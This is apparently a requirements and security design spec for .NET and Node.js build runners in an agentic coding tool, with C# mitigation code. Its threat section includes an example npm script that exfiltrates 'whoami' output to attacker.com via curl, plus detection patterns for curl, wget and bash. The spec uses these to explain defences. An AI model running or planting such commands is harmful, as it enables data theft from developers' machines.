### .NET Runner (FR-019-36 to FR-019-65)

| ID | Requirement |
|----|-------------|
| FR-019-36 | System MUST implement `DotNetRunner : ILanguageRunner` |
| FR-019-37 | DotNetRunner MUST detect `.sln` files |
| FR-019-38 | DotNetRunner MUST detect `.csproj` files |
| FR-019-39 | DotNetRunner MUST detect `.fsproj` files |
| FR-019-40 | DotNetRunner MUST prefer solution files over project files |
| FR-019-41 | DotNetRunner MUST check for `dotnet` CLI availability |
| FR-019-42 | Build MUST use `dotnet build` command |
| FR-019-43 | Build MUST support configuration option (Debug/Release) |
| FR-019-44 | Build MUST support verbosity option (quiet/minimal/normal/detailed/diagnostic) |
| FR-019-45 | Build MUST support --no-restore flag |
| FR-019-46 | Test MUST use `dotnet test` command |
| FR-019-47 | Test MUST support filter option (--filter) |
| FR-019-48 | Test MUST support logger option (--logger) |
| FR-019-49 | Test MUST capture test results from trx/json output |
| FR-019-50 | Run MUST use `dotnet run` command |
| FR-019-51 | Run MUST support project selection |
| FR-019-52 | Run MUST support passing arguments to application |
| FR-019-53 | Restore MUST use `dotnet restore` command |
| FR-019-54 | Restore MUST support source option (--source) |
| FR-019-55 | DotNetRunner MUST parse MSBuild error format |
| FR-019-56 | MSBuild errors MUST extract file, line, column, code, message |
| FR-019-57 | DotNetRunner MUST parse test result output |
| FR-019-58 | Test results MUST include pass/fail/skip counts |
| FR-019-59 | Test results MUST include individual test names |
| FR-019-60 | Test results MUST include failure messages |
| FR-019-61 | DotNetRunner MUST read global.json for SDK version |
| FR-019-62 | DotNetRunner MUST respect Directory.Build.props settings |
| FR-019-63 | DotNetRunner MUST support multi-targeting projects |
| FR-019-64 | DotNetRunner MUST handle project references correctly |
| FR-019-65 | DotNetRunner MUST report NuGet restore errors clearly |

### JavaScript/Node.js Runner (FR-019-66 to FR-019-95)

| ID | Requirement |
|----|-------------|
| FR-019-66 | System MUST implement `NodeRunner : ILanguageRunner` |
| FR-019-67 | NodeRunner MUST detect `package.json` files |
| FR-019-68 | NodeRunner MUST detect package manager (npm, yarn, pnpm) |
| FR-019-69 | Detection MUST check for lock files (package-lock.json, yarn.lock, pnpm-lock.yaml) |
| FR-019-70 | NodeRunner MUST check for `node` and package manager availability |
| FR-019-71 | Build MUST use `npm run build` or equivalent |
| FR-019-72 | Build MUST check if build script exists in package.json |
| FR-019-73 | Build MUST support custom script names via configuration |
| FR-019-74 | Test MUST use `npm test` or configured script |
| FR-019-75 | Test MUST check if test script exists in package.json |
| FR-019-76 | Test MUST support passing additional arguments |
| FR-019-77 | Run MUST use `npm start` or configured script |
| FR-019-78 | Run MUST support `npm run dev` for development mode |
| FR-019-79 | Restore MUST use `npm install` or equivalent |
| FR-019-80 | Restore MUST support --production flag |
| FR-019-81 | Restore MUST support --frozen-lockfile for CI |
| FR-019-82 | NodeRunner MUST parse npm error output |
| FR-019-83 | Error parsing MUST handle ERESOLVE conflicts |
| FR-019-84 | Error parsing MUST handle ENOENT missing packages |
| FR-019-85 | NodeRunner MUST parse jest/mocha test output |
| FR-019-86 | Test results MUST include pass/fail/skip counts |
| FR-019-87 | Test results MUST include individual test names |
| FR-019-88 | Test results MUST include failure details |
| FR-019-89 | NodeRunner MUST read .nvmrc or .node-version |
| FR-019-90 | NodeRunner MUST report Node version mismatches |
| FR-019-91 | NodeRunner MUST handle workspaces (monorepos) |
| FR-019-92 | NodeRunner MUST support running scripts in specific workspace |
| FR-019-93 | NodeRunner MUST handle TypeScript projects |
| FR-019-94 | NodeRunner MUST support ESM and CommonJS |
| FR-019-95 | NodeRunner MUST report security audit findings |

### RunnerResult Model (FR-019-96 to FR-019-110)

| ID | Requirement |
|----|-------------|
| FR-019-96 | System MUST define `RunnerResult` record |
| FR-019-97 | RunnerResult MUST have `Success` property |
| FR-019-98 | RunnerResult MUST have `Errors` collection |
| FR-019-99 | RunnerResult MUST have `Warnings` collection |
| FR-019-100 | RunnerResult MUST have `Duration` property |
| FR-019-101 | RunnerResult MUST have `RawOutput` property |
| FR-019-102 | RunnerResult MUST have `TestResults` property (for test operations) |
| FR-019-103 | TestResults MUST include `PassedCount` |
| FR-019-104 | TestResults MUST include `FailedCount` |
| FR-019-105 | TestResults MUST include `SkippedCount` |
| FR-019-106 | TestResults MUST include `Tests` collection with details |
| FR-019-107 | Error MUST have `File`, `Line`, `Column`, `Code`, `Message` |
| FR-019-108 | Warning MUST have same structure as Error |
| FR-019-109 | RunnerResult MUST be serializable to JSON |
| FR-019-110 | RunnerResult MUST include command that was executed |

---

## Non-Functional Requirements

### Performance (NFR-019-01 to NFR-019-10)

| ID | Requirement | Target | Maximum |
|----|-------------|--------|---------|
| NFR-019-01 | Project detection MUST complete quickly | 50ms | 100ms |
| NFR-019-02 | Command construction MUST be efficient | 5ms | 10ms |
| NFR-019-03 | Output parsing MUST be efficient | 25ms | 50ms per MB |
| NFR-019-04 | Registry lookup MUST be fast | 1ms | 5ms |
| NFR-019-05 | SDK version check MUST be cached | 10ms first, 0ms cached | 50ms |
| NFR-019-06 | Detection results MUST be cached | N/A | N/A |
| NFR-019-07 | Memory usage during parsing MUST be bounded | 10MB | 50MB |
| NFR-019-08 | Large test output (1000+ tests) MUST parse efficiently | 500ms | 2s |
| NFR-019-09 | Multiple project detection MUST parallelize | N/A | N/A |
| NFR-019-10 | Result serialization MUST be fast | 5ms | 20ms |

### Reliability (NFR-019-11 to NFR-019-20)

| ID | Requirement |
|----|-------------|
| NFR-019-11 | System MUST handle missing SDK gracefully |
| NFR-019-12 | System MUST handle invalid project files gracefully |
| NFR-019-13 | System MUST handle partial build output |
| NFR-019-14 | System MUST handle malformed test output |
| NFR-019-15 | System MUST recover from runner crashes |
| NFR-019-16 | System MUST handle concurrent operations |
| NFR-019-17 | System MUST handle network failures during restore |
| NFR-019-18 | System MUST handle disk space exhaustion |
| NFR-019-19 | System MUST handle permission errors |
| NFR-019-20 | System MUST provide fallback to raw output when parsing fails |

### Security (NFR-019-21 to NFR-019-28)

| ID | Requirement |
|----|-------------|
| NFR-019-21 | Runners MUST NOT execute arbitrary user scripts without warning |
| NFR-019-22 | Runners MUST sanitize paths before execution |
| NFR-019-23 | Runners MUST NOT log credentials or tokens |
| NFR-019-24 | Runners MUST respect network restrictions in air-gapped mode |
| NFR-019-25 | Runners MUST validate project file integrity |
| NFR-019-26 | Runners MUST report security audit warnings |
| NFR-019-27 | Runners MUST use secure registry connections (HTTPS) |
| NFR-019-28 | Runners MUST NOT expose sensitive environment variables |

### Maintainability (NFR-019-29 to NFR-019-38)

| ID | Requirement |
|----|-------------|
| NFR-019-29 | Code MUST follow SOLID principles |
| NFR-019-30 | ILanguageRunner MUST be mockable for testing |
| NFR-019-31 | Parsers MUST be independently testable |
| NFR-019-32 | All public APIs MUST have XML documentation |
| NFR-019-33 | Configuration MUST be externalizable |
| NFR-019-34 | Runners MUST be extensible via plugins |
| NFR-019-35 | Error codes MUST be documented |
| NFR-019-36 | Code coverage MUST exceed 80% |
| NFR-019-37 | Each runner MUST be independently deployable |
| NFR-019-38 | Parsing logic MUST be separated from execution logic |

### Observability (NFR-019-39 to NFR-019-48)

| ID | Requirement |
|----|-------------|
| NFR-019-39 | All operations MUST be logged with correlation IDs |
| NFR-019-40 | Operation duration MUST be emitted as metric |
| NFR-019-41 | Operation success/failure MUST be emitted as metric |
| NFR-019-42 | Parse errors MUST be logged at warning level |
| NFR-019-43 | SDK version MUST be logged at startup |
| NFR-019-44 | Detection results MUST be logged |
| NFR-019-45 | Build/test failures MUST include structured error details |
| NFR-019-46 | Test results MUST be loggable in summary form |
| NFR-019-47 | Health check MUST report runner availability |
| NFR-019-48 | Restore operations MUST log package counts |

---

## User Manual Documentation

### Overview

Language Runners are specialized execution adapters that enable Agentic Coding Bot to work intelligently with different programming ecosystems. Each runner understands the conventions, tools, and output formats of its target language.

The runner system provides a unified abstraction layer—commands like "build" and "test" work consistently regardless of whether the project uses .NET, Node.js, or other supported platforms.

### Supported Languages

| Language | Runner | Detection Patterns | Build Tool | Test Framework |
|----------|--------|-------------------|------------|----------------|
| .NET | DotNetRunner | *.sln, *.csproj, *.fsproj | dotnet CLI | dotnet test (xUnit, NUnit, MSTest) |
| Node.js | NodeRunner | package.json | npm/yarn/pnpm | npm test (Jest, Mocha, etc.) |

### Configuration

Configure runner behavior in `.agent/config.yml`:

```yaml
# .agent/config.yml
runners:
  # .NET Runner Configuration
  dotnet:
    # Enable/disable .NET runner
    enabled: true
    
    # Default build configuration
    configuration: Debug
    
    # Build verbosity level
    # Options: quiet, minimal, normal, detailed, diagnostic
    verbosity: minimal
    
    # Custom dotnet CLI path (optional)
    # Useful when dotnet is not in PATH
    path: null
    
    # Additional MSBuild properties
    msbuild_properties:
      TreatWarningsAsErrors: false
    
    # Test settings
    test:
      # Default logger format
      logger: trx
      # Collect code coverage
      collect_coverage: false
      # Test result output directory
      results_directory: ./TestResults
  
  # Node.js Runner Configuration
  node:
    # Enable/disable Node runner
    enabled: true
    
    # Package manager to use
    # Options: npm, yarn, pnpm, auto (detect from lock file)
    package_manager: auto
    
    # Custom node/npm path (optional)
    path: null
    
    # Build script name in package.json
    build_script: build
    
    # Test script name in package.json
    test_script: test
    
    # Development run script
    dev_script: dev
    
    # Production run script
    start_script: start
    
    # Install settings
    install:
      # Use frozen lockfile (CI mode)
      frozen_lockfile: false
      # Production dependencies only
      production: false
    
    # Test settings
    test:
      # Additional arguments for test command
      additional_args: []
```

### Supported Operations

| Operation | Description | .NET Command | Node.js Command |
|-----------|-------------|--------------|-----------------|
| detect | Find project files | Scan for *.sln, *.csproj | Scan for package.json |
| build | Compile source code | `dotnet build` | `npm run build` |
| test | Run test suite | `dotnet test` | `npm test` |
| run | Start application | `dotnet run` | `npm start` |
| restore | Install dependencies | `dotnet restore` | `npm install` |

### CLI Commands

#### Project Detection

```bash
# Detect all projects in current directory
acode project detect

# Detect with verbose output
acode project detect --verbose

# Detect in specific directory
acode project detect --path ./src

# Output as JSON
acode project detect --json
```

**Example Output:**
```
Detected Projects:
  1. MyApp.sln (dotnet)
     SDK: 8.0.100
     Projects:
     ├── src/MyApp/MyApp.csproj (.NET 8.0)
     ├── src/MyApp.Core/MyApp.Core.csproj (.NET 8.0)
     └── tests/MyApp.Tests/MyApp.Tests.csproj (.NET 8.0)

  2. frontend (node)
     Package Manager: npm
     Node Version: 20.x (from .nvmrc)
     └── frontend/package.json
```

#### Building Projects

```bash
# Build using detected runner
acode build

# Build with specific configuration
acode build --configuration Release

# Build with verbosity
acode build --verbosity detailed

# Build specific project
acode build --project src/MyApp/MyApp.csproj

# Build without restoring
acode build --no-restore
```

**Example Output:**
```
Building MyApp.sln (Debug)...
  Restoring packages...
  MyApp.Core -> bin/Debug/net8.0/MyApp.Core.dll
  MyApp -> bin/Debug/net8.0/MyApp.dll

Build succeeded.
    0 Warning(s)
    0 Error(s)

Time Elapsed: 00:00:04.52
```

#### Running Tests

```bash
# Run all tests
acode test

# Run with filter
acode test --filter "Category=Unit"

# Run with verbosity
acode test --verbosity detailed

# Run specific test project
acode test --project tests/MyApp.Tests

# Run with coverage
acode test --collect "Code Coverage"
```

**Example Output:**
```
Running tests for MyApp.Tests...

  ✓ UserServiceTests.CreateUser_ValidInput_Succeeds (45ms)
  ✓ UserServiceTests.CreateUser_DuplicateEmail_Fails (12ms)
  ✓ OrderServiceTests.PlaceOrder_ValidOrder_Succeeds (89ms)
  ✗ PaymentServiceTests.ProcessPayment_InvalidCard_Fails
    Expected: PaymentException
    Actual: No exception thrown
    at PaymentServiceTests.cs:45

Passed!  - Failed: 1, Passed: 44, Skipped: 2, Total: 47
Duration: 3.2 s
```

#### Running Applications

```bash
# Run application
acode run

# Run with arguments
acode run -- --port 8080

# Run in development mode (Node.js)
acode run --dev

# Run specific project (.NET)
acode run --project src/MyApp
```

#### Restoring Dependencies

```bash
# Restore all dependencies
acode restore

# Restore for production (Node.js)
acode restore --production

# Restore with locked versions
acode restore --locked

# Restore specific source (.NET)
acode restore --source https://nuget.mycompany.com/v3/index.json
```

### Error Output Format

Runners normalize errors into a consistent format:

```json
{
  "errors": [
    {
      "file": "src/MyApp/UserService.cs",
      "line": 42,
      "column": 15,
      "code": "CS1002",
      "message": "; expected",
      "severity": "error"
    }
  ],
  "warnings": [
    {
      "file": "src/MyApp/OrderService.cs",
      "line": 10,
      "column": 1,
      "code": "CS0168",
      "message": "The variable 'ex' is declared but never used",
      "severity": "warning"
    }
  ]
}
```

### Troubleshooting

#### SDK Not Found

**Problem:** Runner reports "dotnet SDK not found" or "node not found"

**Causes:**
1. SDK not installed
2. SDK not in PATH
3. Version mismatch with project requirements

**Solutions:**
1. Install the required SDK
2. Add SDK to PATH environment variable
3. Configure custom path in `.agent/config.yml`
4. Check global.json or .nvmrc for version requirements

#### Build Script Not Found (Node.js)

**Problem:** "npm ERR! missing script: build"

**Causes:**
1. No "build" script defined in package.json
2. Script has different name

**Solutions:**
1. Add build script to package.json
2. Configure custom build_script in config
3. Run with explicit script: `acode build --script custom-build`

#### Dependency Restore Fails

**Problem:** Packages fail to download

**Causes:**
1. Network connectivity issues
2. Private registry authentication
3. Package version conflicts

**Solutions:**
1. Check network connectivity
2. Configure registry credentials
3. Run `npm audit fix` or update conflicting packages

#### Build Errors Not Parsed

**Problem:** Errors appear but aren't structured

**Causes:**
1. Non-standard error format
2. Toolchain-specific output
3. Parser doesn't recognize format

**Solutions:**
1. Check raw output with `--verbose`
2. Report issue for parser improvement
3. Use standard toolchain output formats

---

## Assumptions

### Technical Assumptions

1. **SDK Availability:** At least one of .NET SDK (version 6.0+) or Node.js (version 16.x+) is installed on the system and accessible via PATH environment variable.

2. **Project File Validity:** The repository contains well-formed project files (`.sln`, `.csproj`, `.fsproj`, `package.json`) that parse correctly as XML or JSON without syntax errors.

3. **Standard Project Layouts:** Project files follow standard ecosystem conventions (e.g., .NET projects have `.csproj` in source directories, Node.js projects have `package.json` at project root) and are not deeply nested in unusual directory structures (e.g., more than 10 levels deep).

4. **Build Tool Stability:** SDKs and build tools (`dotnet`, `npm`, `yarn`, `pnpm`) produce consistent, parseable output formats across minor version updates. Major version changes may require parser updates.

5. **Command Execution Permissions:** The runtime user has permission to execute build tools, create files in output directories (`bin/`, `dist/`, `node_modules/`), and read project files without privilege escalation.

6. **File System Encoding:** Project files, source code, and paths use UTF-8 encoding or a compatible encoding that doesn't cause parsing failures. File names don't contain invalid characters for the target OS.

7. **Reasonable Operation Timeouts:** Build and test operations complete within configured timeout limits (default: 10 minutes for build, 30 minutes for tests). Long-running operations may be terminated.

8. **Deterministic Builds:** Build tools produce the same output given the same input (source code, dependencies, SDK version). Non-deterministic build processes (e.g., embedding timestamps without flags) may cause inconsistent results.

9. **Lock File Availability:** Node.js projects have lock files (`package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`) checked into version control for reproducible dependency installation. Missing lock files may cause version mismatches.

10. **Target Framework Compatibility:** .NET projects target frameworks supported by the installed SDK (e.g., .NET 6.0+ projects require .NET 6 SDK or higher). Targeting unsupported frameworks causes build failures.

### Operational Assumptions

11. **Network Access for Restore:** Package registries (nuget.org, npmjs.com, custom registries) are accessible over HTTPS when running restore operations, unless offline mode is configured with pre-populated caches.

12. **Sufficient Disk Space:** The system has sufficient disk space for dependency downloads (e.g., `node_modules/` can be 500MB+, NuGet cache can be 2GB+) and build outputs without running out of space mid-operation.

13. **Working Directory Context:** The current working directory is set correctly before invoking runner operations. Runners assume relative paths are resolved from the project root containing the detected project file.

14. **Environment Variable Configuration:** SDK-specific environment variables (`DOTNET_ROOT`, `NODE_PATH`, registry authentication tokens) are configured correctly if required. Missing environment variables cause SDK detection or restore failures.

15. **Single Project Per Directory:** Each directory contains at most one primary project (one `.sln` or `package.json` at the root level). Multiple projects in the same directory require explicit `--project` flag to disambiguate.

### Integration Assumptions

16. **Task 018 Command Executor:** The command executor (Task 018) correctly captures stdout/stderr, reports exit codes, respects timeouts, and sanitizes environment variables. Runner output parsing depends on complete, untruncated command output.

17. **Task 002 Configuration Contract:** Configuration overrides (`.agent/config.yml`) are loaded before runner initialization. Runners access validated configuration via dependency injection, not direct file reads.

18. **Dependency Resolution:** Project dependencies listed in manifests (NuGet packages in `.csproj`, npm packages in `package.json`) are resolvable from configured registries without authentication errors or network failures.

19. **Test Framework Conventions:** Test projects follow standard naming conventions (e.g., `*.Tests.csproj`, `*.test.js`, `*.spec.ts`) and use well-known test frameworks (xUnit, NUnit, MSTest, Jest, Mocha) with predictable output formats.

20. **No Conflicting Global Tools:** System-wide SDK installations don't conflict with project-specific SDK requirements (e.g., global `dotnet` version matches or exceeds `global.json` requirement). Version mismatches are detected and reported clearly.

---

## Security Considerations

### Threat 1: Command Injection via Malicious Project Files

**Risk Description:** An attacker crafts a malicious `.csproj` or `package.json` file containing shell injection payloads in project names, package names, or script definitions. When the runner constructs commands using these values, the payload executes arbitrary code.

**Attack Scenario:**
```json
// Malicious package.json
{
  "name": "legit-package",
  "scripts": {
    "build": "webpack && curl http://attacker.com/steal?data=$(whoami)"
  }
}
```

When `acode build` runs, the NodeRunner executes `npm run build`, which runs the malicious script that exfiltrates data.

**Mitigation (Complete C# Implementation):**

```csharp
namespace AgenticCoder.Infrastructure.Runners.Security;

using System.Text.RegularExpressions;

/// <summary>
/// Validates and sanitizes project metadata to prevent command injection.
/// </summary>
public sealed class ProjectMetadataSanitizer
{
    private static readonly Regex CommandInjectionPattern = new(
        @"[;&|`$(){}[\]<>]",
        RegexOptions.Compiled);

    private static readonly Regex SuspiciousScriptPattern = new(
        @"(curl|wget|bash|sh|eval|exec|system|proc_open)\s",
        RegexOptions.Compiled | RegexOptions.IgnoreCase);

    private readonly ILogger<ProjectMetadataSanitizer> _logger;

    public ProjectMetadataSanitizer(ILogger<ProjectMetadataSanitizer> logger)
    {
        _logger = logger;
    }

    /// <summary>
    /// Validates project name doesn't contain command injection characters.
    /// </summary>
    public ValidationResult ValidateProjectName(string projectName)
    {
        if (string.IsNullOrWhiteSpace(projectName))
        {
            return ValidationResult.Fail("Project name cannot be empty");
        }

        if (CommandInjectionPattern.IsMatch(projectName))
        {
            _logger.LogWarning(
                "Project name '{ProjectName}' contains potentially dangerous characters",
                projectName);

            return ValidationResult.Fail(
                $"Project name contains invalid characters: {projectName}. " +
                "Only alphanumeric, dash, underscore, and dot allowed.");
        }

        return ValidationResult.Success();
    }

    /// <summary>
    /// Validates npm script doesn't contain suspicious shell commands.
    /// </summary>
    public ValidationResult ValidateNpmScript(string scriptName, string scriptContent)
    {
        if (SuspiciousScriptPattern.IsMatch(scriptContent))
        {
            _logger.LogWarning(
                "Script '{ScriptName}' contains potentially dangerous commands: {Script}",
                scriptName,
                scriptContent);

            return ValidationResult.Warn(
                $"Script '{scriptName}' contains shell commands (curl, bash, eval). " +
                "Review script before execution for security risks.");
        }

        // Detect piped curl/wget patterns (curl | bash)
        if (scriptContent.Contains("curl") && scriptContent.Contains("|"))
        {
            _logger.LogError(
                "Script '{ScriptName}' contains curl pipe pattern: {Script}",
                scriptName,
                scriptContent);

            return ValidationResult.Fail(
                $"Script '{scriptName}' uses dangerous curl|bash pattern. " +
                "This is blocked for security. Use explicit install methods.");
        }

        return ValidationResult.Success();
    }

    /// <summary>
    /// Sanitizes file path arguments to prevent directory traversal.
    /// </summary>
    public string SanitizePath(string path)
    {
        // Normalize path separators
        path = path.Replace('\\', '/');

        // Remove dangerous patterns
        path = path.Replace("../", "");
        path = path.Replace("./", "");

        // Remove leading/trailing whitespace and quotes
        path = path.Trim().Trim('"', '\'');

        return Path.GetFullPath(path);
    }
}

public sealed record ValidationResult
{
    public bool IsValid { get; init; }
    public string? Message { get; init; }
    public ValidationSeverity Severity { get; init; }

    public static ValidationResult Success() =>
        new() { IsValid = true, Severity = ValidationSeverity.Info };

    public static ValidationResult Warn(string message) =>
        new() { IsValid = true, Message = message, Severity = ValidationSeverity.Warning };

    public static ValidationResult Fail(string message) =>
        new() { IsValid = false, Message = message, Severity = ValidationSeverity.Error };
}

public enum ValidationSeverity { Info, Warning, Error }
```

---

### Threat 2: Dependency Confusion Attack via Package Restoration

**Risk Description:** An attacker publishes a malicious package to a public registry (npm, NuGet) with the same name as a private internal package. When the runner executes `restore`, the build tool downloads the attacker's package instead of the internal one, leading to code execution during install scripts or build.

**Attack Scenario:**
```json
// package.json (expects internal @company/auth package)
{
  "dependencies": {
    "@company/auth": "^1.0.0"
  }
}
```

Attacker publishes public `@company/auth@2.0.0` to npm with malicious `postinstall` script. If registry priority is misconfigured, npm installs the public package.

**Mitigation (Complete C# Implementation):**

```csharp
namespace AgenticCoder.Infrastructure.Runners.Security;

/// <summary>
/// Validates package sources and enforces registry policies.
/// </summary>
public sealed class PackageSourceValidator
{
    private readonly IConfiguration _config;
    private readonly ILogger<PackageSourceValidator> _logger;

    public PackageSourceValidator(
        IConfiguration config,
        ILogger<PackageSourceValidator> logger)
    {
        _config = config;
        _logger = logger;
    }

    /// <summary>
    /// Validates NuGet package sources before restore.
    /// </summary>
    public ValidationResult ValidateNuGetSources(IEnumerable<string> sources)
    {
        var allowedSources = _config
            .GetSection("Runners:DotNet:AllowedPackageSources")
            .Get<string[]>() ?? new[] { "https://api.nuget.org/v3/index.json" };

        foreach (var source in sources)
        {
            if (!allowedSources.Contains(source, StringComparer.OrdinalIgnoreCase))
            {
                _logger.LogError(
                    "Untrusted NuGet source detected: {Source}. Allowed sources: {Allowed}",
                    source,
                    string.Join(", ", allowedSources));

                return ValidationResult.Fail(
                    $"NuGet source '{source}' is not in allowed list. " +
                    "Configure allowed sources in .agent/config.yml");
            }

            // Enforce HTTPS
            if (!source.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            {
                _logger.LogError("Insecure HTTP NuGet source: {Source}", source);
                return ValidationResult.Fail(
                    $"NuGet source must use HTTPS: {source}");
            }
        }

        return ValidationResult.Success();
    }

    /// <summary>
    /// Validates npm registry configuration before restore.
    /// </summary>
    public ValidationResult ValidateNpmRegistry(string packageJsonPath)
    {
        // Read package.json to check for scoped registry overrides
        var packageJson = File.ReadAllText(packageJsonPath);
        var config = JsonSerializer.Deserialize<PackageJsonConfig>(packageJson);

        // Check for private scope registries (e.g., @company scope)
        var scopedRegistries = config?.PublishConfig?.Registry;
        if (!string.IsNullOrEmpty(scopedRegistries))
        {
            var allowedRegistries = _config
                .GetSection("Runners:Node:AllowedRegistries")
                .Get<string[]>() ?? new[] { "https://registry.npmjs.org" };

            if (!allowedRegistries.Contains(scopedRegistries))
            {
                _logger.LogWarning(
                    "Package specifies registry '{Registry}' not in allowed list",
                    scopedRegistries);

                return ValidationResult.Warn(
                    $"Package registry '{scopedRegistries}' is not pre-approved. " +
                    "Verify this registry is trusted before running restore.");
            }
        }

        return ValidationResult.Success();
    }

    /// <summary>
    /// Generates safe npm install command with lockfile verification.
    /// </summary>
    public string BuildSafeNpmInstallCommand(string packageManager, bool isCi)
    {
        // Use frozen lockfile in CI to prevent dependency updates
        return packageManager switch
        {
            "npm" => isCi ? "npm ci" : "npm install",
            "yarn" => isCi ? "yarn install --frozen-lockfile" : "yarn install",
            "pnpm" => isCi ? "pnpm install --frozen-lockfile" : "pnpm install",
            _ => throw new NotSupportedException($"Package manager '{packageManager}' not supported")
        };
    }
}

internal sealed class PackageJsonConfig
{
    [JsonPropertyName("publishConfig")]
    public PublishConfig? PublishConfig { get; set; }
}

internal sealed class PublishConfig
{
    [JsonPropertyName("registry")]
    public string? Registry { get; set; }
}
```

---

### Threat 3: Path Traversal via Project File Paths

**Risk Description:** A malicious project file specifies output paths or reference paths that traverse outside the project directory (e.g., `../../etc/shadow`), potentially overwriting system files or reading sensitive data when the runner processes the project.

**Attack Scenario:**
```xml
<!-- Malicious .csproj -->
<Project>
  <PropertyGroup>
    <OutputPath>../../../tmp/malicious/</OutputPath>
  </PropertyGroup>
</Project>
```

When `dotnet build` runs, it writes DLLs to `/tmp/malicious/` outside the project tree, potentially overwriting files.

**Mitigation (Complete C# Implementation):**

```csharp
namespace AgenticCoder.Infrastructure.Runners.Security;

/// <summary>
/// Validates file paths to prevent directory traversal attacks.
/// </summary>
public sealed class PathTraversalGuard
{
    private readonly ILogger<PathTraversalGuard> _logger;

    public PathTraversalGuard(ILogger<PathTraversalGuard> logger)
    {
        _logger = logger;
    }

    /// <summary>
    /// Validates that a path is within allowed project boundaries.
    /// </summary>
    public ValidationResult ValidatePath(string path, string projectRoot)
    {
        // Normalize paths to absolute form
        var absolutePath = Path.GetFullPath(path);
        var absoluteRoot = Path.GetFullPath(projectRoot);

        // Check if path is under project root
        if (!absolutePath.StartsWith(absoluteRoot, StringComparison.OrdinalIgnoreCase))
        {
            _logger.LogError(
                "Path traversal attempt detected. Path: {Path}, Root: {Root}",
                absolutePath,
                absoluteRoot);

            return ValidationResult.Fail(
                $"Path '{path}' is outside project root '{projectRoot}'. " +
                "Path traversal is not allowed for security.");
        }

        // Check for dangerous system directories
        var dangerousPatterns = new[]
        {
            "/etc/", "/sys/", "/proc/", "/dev/",
            "C:\\Windows\\", "C:\\Program Files\\", "/usr/bin/", "/bin/"
        };

        foreach (var pattern in dangerousPatterns)
        {
            if (absolutePath.Contains(pattern, StringComparison.OrdinalIgnoreCase))
            {
                _logger.LogError(
                    "Attempt to access system directory: {Path}",
                    absolutePath);

                return ValidationResult.Fail(
                    $"Access to system directory '{pattern}' is not allowed.");
            }
        }

        return ValidationResult.Success();
    }

    /// <summary>
    /// Sanitizes output path from project configuration.
    /// </summary>
    public string SanitizeOutputPath(string outputPath, string projectRoot)
    {
        // Remove directory traversal sequences
        outputPath = outputPath.Replace("../", "").Replace("..\\", "");

        // Ensure path is relative
        if (Path.IsPathRooted(outputPath))
        {
            _logger.LogWarning(
                "Absolute output path converted to relative: {Path}",
                outputPath);

            outputPath = Path.GetFileName(outputPath);
        }

        // Combine with project root to create safe absolute path
        var safePath = Path.Combine(projectRoot, outputPath);
        return Path.GetFullPath(safePath);
    }

    /// <summary>
    /// Validates that working directory is safe before command execution.
    /// </summary>
    public ValidationResult ValidateWorkingDirectory(string workingDir)
    {
        if (!Directory.Exists(workingDir))
        {
            return ValidationResult.Fail(
                $"Working directory does not exist: {workingDir}");
        }

        // Prevent running commands in system directories
        var absoluteDir = Path.GetFullPath(workingDir);
        var systemPaths = new[] { "/", "C:\\", "/usr/", "/bin/", "/etc/" };

        if (systemPaths.Any(sp =>
            absoluteDir.Equals(sp, StringComparison.OrdinalIgnoreCase)))
        {
            _logger.LogError(
                "Blocked command execution in system directory: {Dir}",
                absoluteDir);

            return ValidationResult.Fail(
                "Cannot execute build commands in system directories");
        }

        return ValidationResult.Success();
    }
}
```

---

### Threat 4: Secrets Exposure in Build Output

**Risk Description:** Build tools may log sensitive information (API keys, passwords, connection strings) to stdout/stderr during build or test execution. The runner captures this output and may inadvertently log or display secrets to users or log files.

**Attack Scenario:**
```bash
# .NET build output
Building MyApp.csproj...
  Connection string: Server=prod.db.com;User=admin;Password=SecretPass123
  Build succeeded.
```

The runner captures this output verbatim. If logged to files or displayed in CI logs, the password is exposed.

**Mitigation (Complete C# Implementation):**

```csharp
namespace AgenticCoder.Infrastructure.Runners.Security;

/// <summary>
/// Sanitizes build output to remove sensitive information before logging.
/// </summary>
public sealed class OutputSanitizer
{
    private static readonly Regex[] SecretPatterns = new[]
    {
        new Regex(@"password\s*[:=]\s*[^\s;]+", RegexOptions.IgnoreCase | RegexOptions.Compiled),
        new Regex(@"api[_-]?key\s*[:=]\s*[^\s;]+", RegexOptions.IgnoreCase | RegexOptions.Compiled),
        new Regex(@"secret\s*[:=]\s*[^\s;]+", RegexOptions.IgnoreCase | RegexOptions.Compiled),
        new Regex(@"token\s*[:=]\s*[^\s;]+", RegexOptions.IgnoreCase | RegexOptions.Compiled),
        new Regex(@"(ghp|gho|ghu|ghs|ghr)_[a-zA-Z0-9]{36,255}", RegexOptions.Compiled), // GitHub tokens
        new Regex(@"AKIA[0-9A-Z]{16}", RegexOptions.Compiled), // AWS access keys
        new Regex(@"sk-[a-zA-Z0-9]{32,}", RegexOptions.Compiled), // OpenAI keys
        new Regex(@"-----BEGIN (RSA )?PRIVATE KEY-----", RegexOptions.IgnoreCase | RegexOptions.Compiled),
    };

    private readonly ILogger<OutputSanitizer> _logger;

    public OutputSanitizer(ILogger<OutputSanitizer> logger)
    {
        _logger = logger;
    }

    /// <summary>
    /// Removes sensitive patterns from build output.
    /// </summary>
    public string Sanitize(string output)
    {
        var sanitized = output;
        var secretsFound = 0;

        foreach (var pattern in SecretPatterns)
        {
            var matches = pattern.Matches(sanitized);
            if (matches.Count > 0)
            {
                secretsFound += matches.Count;
                sanitized = pattern.Replace(sanitized, match =>
                {
                    // Replace secret value with asterisks, keep key name visible
                    var parts = match.Value.Split(new[] { ':', '=' }, 2);
                    if (parts.Length == 2)
                    {
                        return $"{parts[0]}=***REDACTED***";
                    }
                    return "***REDACTED***";
                });
            }
        }

        if (secretsFound > 0)
        {
            _logger.LogWarning(
                "Sanitized {Count} potential secrets from build output",
                secretsFound);
        }

        return sanitized;
    }

    /// <summary>
    /// Sanitizes file paths to remove user-specific directories.
    /// </summary>
    public string SanitizeFilePaths(string output, string projectRoot)
    {
        // Replace absolute paths with relative paths
        var userHome = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        if (!string.IsNullOrEmpty(userHome))
        {
            output = output.Replace(userHome, "~", StringComparison.OrdinalIgnoreCase);
        }

        // Replace project root with relative notation
        if (!string.IsNullOrEmpty(projectRoot))
        {
            output = output.Replace(projectRoot, ".", StringComparison.OrdinalIgnoreCase);
        }

        return output;
    }

    /// <summary>
    /// Wraps a RunnerResult with sanitized output.
    /// </summary>
    public RunnerResult SanitizeResult(RunnerResult result, string projectRoot)
